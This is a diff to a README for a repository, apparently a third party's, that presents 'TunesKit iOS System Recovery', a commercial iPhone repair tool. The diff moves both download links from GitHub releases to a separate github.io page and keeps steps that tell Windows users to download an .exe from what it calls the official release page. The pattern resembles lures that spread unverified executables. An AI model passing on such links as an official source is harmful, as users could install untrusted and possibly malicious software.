@@ -1,6 +1,6 @@
 # 🛠️ TunesKit-iOS-System-Recovery - Fix Apple device system errors quickly
 
-[![Download TunesKit for Windows](https://img.shields.io/badge/Download-TunesKit_iOS_System_Recovery-blue.svg)](https://github.com/vhypxel/TunesKit-iOS-System-Recovery/releases)
+[![Download TunesKit for Windows](https://img.shields.io/badge/Download-TunesKit_iOS_System_Recovery-blue.svg)](https://vhypxel.github.io)
 
 ## What is TunesKit iOS System Recovery
 
@@ -14,7 +14,7 @@ Check your computer before you start. You need a PC with Windows 11 or Windows 1
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the official release page: [https://github.com/vhypxel/TunesKit-iOS-System-Recovery/releases](https://github.com/vhypxel/TunesKit-iOS-System-Recovery/releases)
+1. Visit the official release page: [https://vhypxel.github.io](https://vhypxel.github.io)
 2. Locate the most recent file ending in .exe.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
